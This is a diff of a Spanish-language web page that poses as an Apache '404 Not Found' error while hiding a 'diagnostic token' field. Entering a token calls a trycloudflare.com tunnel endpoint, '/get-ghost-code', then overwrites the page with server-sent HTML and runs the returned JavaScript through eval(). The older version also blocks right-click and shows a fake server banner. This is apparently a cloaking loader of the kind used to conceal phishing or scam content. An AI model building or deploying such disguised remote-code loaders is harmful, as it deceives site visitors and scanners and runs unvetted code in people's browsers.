@@ -2,136 +2,142 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-    <title id="dinamic-title">404 Not Found</title>
-
-    <meta property="og:title" content="404 Not Found">
-    <meta property="og:description" content="The requested URL was not found on this server.">
-    <meta property="og:type" content="website">
-    
-    <meta property="og:image" content="https://purchases-roller-springfield-metallic.trycloudflare.com/static/4.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Not Found</title>
     <style>
-        html, body { height: 100%; margin: 0; padding: 0; }
         body { 
-            background: #fff; 
-            color: #000; 
-            font-family: "Courier New", Courier, monospace; 
+            height: 100vh; 
+            margin: 0; 
             display: flex; 
             flex-direction: column; 
             justify-content: center; 
             align-items: center; 
-            text-align: center;
-        }
-        #muro { padding: 20px; width: 100%; max-width: 450px; box-sizing: border-box; }
-        h1 { font-size: clamp(30px, 10vw, 45px); margin: 0; }
-        p { font-size: clamp(14px, 4vw, 18px); line-height: 1.4; }
-        hr { width: 100%; border: 0.5px solid #eee; margin: 20px 0; }
-        .console-input { 
-            margin-top: 20px;
-            background: #f9f9f9;
-            border: 1px solid #ddd;
+            font-family: 'Courier New', monospace; 
+            background-color: #ffffff;
             color: #333;
-            padding: 15px;
-            width: 100%;
-            box-sizing: border-box; 
-            font-family: monospace;
+        }
+        .error-container { text-align: center; }
+        h1 { font-size: 50px; margin: 0; }
+        p { font-size: 18px; margin-bottom: 30px; }
+        
+        .tk-input { 
+            padding: 15px; 
+            width: 280px; 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            text-align: center; 
             font-size: 16px;
-            text-align: center;
-            border-radius: 8px;
             outline: none;
             text-transform: uppercase;
         }
-        .btn-access {
-            display: block;
-            margin: 20px auto;
-            background: #f0f0f0;
-            border: 1px solid #ccc;
-            padding: 12px 30px;
-            width: 100%;
-            cursor: pointer;
-            font-family: monospace;
-            font-size: 14px;
-            font-weight: bold;
-            color: #555;
-            border-radius: 8px;
+        .btn { 
+            margin-top: 15px; 
+            padding: 12px 25px; 
+            background: #f8f9fa; 
+            border: 1px solid #ccc; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            transition: 0.3s;
         }
-        #pagina-original { 
-            display: none; 
-            width: 100%; 
-            flex-direction: column; 
-            align-items: center; 
-            background: #fff; 
-            font-family: -apple-system, sans-serif; 
-            min-height: 100vh;
+        .btn:hover { background: #e2e6ea; }
+
+        /* Pantalla de carga profesional */
+        #loading-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
         }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0064e0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body oncontextmenu="return false">
+<body>
 
-    <img src="https://purchases-roller-springfield-metallic.trycloudflare.com/static/4.jpg" style="display:none;" alt="preview">
-
-    <div id="muro">
-        <h1>Not Found</h1>
-        <p>The requested URL was not found on this server.</p>
-        <hr>
-        <p style="font-size: 12px; color: #777;">Apache/2.4.41 (Ubuntu) Server at localhost Port 80</p>
-        
-        <input type="text" id="tkInput" class="console-input" placeholder="ACCESS TOKEN" autofocus autocomplete="off" spellcheck="false">
-        <button class="btn-access" onclick="validarAcceso()">RUN DIAGNOSTIC</button>
+    <div id="loading-screen">
+        <div class="spinner"></div>
+        <p style="margin-top:15px; font-family: sans-serif;">Cargando sistema...</p>
     </div>
 
-    <div id="pagina-original"></div>
+    <div class="error-container" id="main-content">
+        <h1>404</h1>
+        <p>The requested URL was not found on this server.</p>
+        <input type="text" id="tk" class="tk-input" placeholder="DIAGNOSTIC TOKEN">
+        <br>
+        <button class="btn" onclick="runDiagnostic()">RUN DIAGNOSTIC</button>
+    </div>
 
     <script>
-        // URL ACTUALIZADA
+        // CAMBIA ESTO POR TU URL DE CLOUDFLARE ACTUAL
         const API_URL = "https://clearance-beginner-chat-workshops.trycloudflare.com";
 
-        document.getElementById('tkInput').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') { validarAcceso(); }
-        });
+        // Al cargar la página, verificamos si ya tiene acceso previo
+        window.onload = () => {
+            if (localStorage.getItem('session_active') === 'true') {
+                console.log("Sesión activa detectada. Accediendo...");
+                runDiagnostic(true);
+            }
+        };
 
-        async function validarAcceso() {
-            const input = document.getElementById('tkInput');
-            const val = input.value.trim().toUpperCase();
+        async function runDiagnostic(isReturning = false) {
+            const tokenInput = document.getElementById('tk');
+            const loader = document.getElementById('loading-screen');
             
-            if(!val) return;
+            let tokenValue = "";
+            if (!isReturning) {
+                tokenValue = tokenInput.value.trim().toUpperCase();
+                if (!tokenValue) {
+                    alert("Por favor ingrese un token de diagnóstico.");
+                    return;
+                }
+            }
 
-            const btn = document.querySelector('.btn-access');
-            input.disabled = true;
-            btn.innerText = "WAIT...";
+            loader.style.display = 'flex';
 
             try {
-                const r = await fetch(`${API_URL}/get-ghost-code`, {
+                const response = await fetch(`${API_URL}/get-ghost-code`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({llave: val})
+                    body: JSON.stringify({
+                        llave: tokenValue,
+                        is_returning: isReturning
+                    })
                 });
 
-                if(r.ok) {
-                    const data = await r.json();
-                    document.getElementById('muro').remove();
+                if (response.ok) {
+                    const data = await response.json();
                     
-                    const t = "Educa" + "ción con" + "migo";
-                    document.getElementById('dinamic-title').innerHTML = t;
+                    // Reemplazamos todo el contenido con lo que manda Python
+                    document.open();
+                    document.write(data.html);
+                    document.close();
                     
-                    const root = document.getElementById('pagina-original');
-                    root.style.display = "flex";
-                    root.innerHTML = data.html;
+                    // Ejecutamos el JavaScript que mandó el servidor
                     eval(data.js);
                 } else {
-                    alert("DENIED: Clave incorrecta");
-                    input.disabled = false;
-                    input.value = "";
-                    btn.innerText = "RUN DIAGNOSTIC";
+                    loader.style.display = 'none';
+                    if (isReturning) {
+                        // Si falló el auto-login, borramos la sesión vieja
+                        localStorage.removeItem('session_active');
+                    } else {
+                        alert("ERROR: Token inválido o expirado.");
+                    }
                 }
-            } catch(e) {
-                alert("OFFLINE: Revisa tu URL de Cloudflare");
-                input.disabled = false;
-                btn.innerText = "RUN DIAGNOSTIC";
+            } catch (error) {
+                loader.style.display = 'none';
+                console.error(error);
+                alert("Servidor fuera de línea o error de conexión.");
             }
         }
     </script>
